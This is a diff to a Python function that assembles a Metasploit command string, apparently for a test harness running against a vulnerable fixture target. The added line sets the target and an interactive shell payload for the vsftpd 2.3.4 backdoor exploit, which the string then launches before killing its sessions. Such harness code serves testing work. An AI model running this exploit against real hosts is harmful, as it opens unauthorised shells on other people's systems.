@@ -132,6 +132,7 @@ def build_tool_command(tool_id: str, target_id: str, profile_id: str) -> ToolCom
     if tool_id == "metasploit" and target_id == "metasploit-fixture":
         resource_commands = (
             "use exploit/unix/ftp/vsftpd_234_backdoor; "
+            "set TARGET 1; set PAYLOAD cmd/unix/interact; "
             f"set RHOSTS {target.host}; set RPORT {target.port}; "
             "set WfsDelay 1; exploit -j; sleep 2; sessions -K; exit -y"
         )
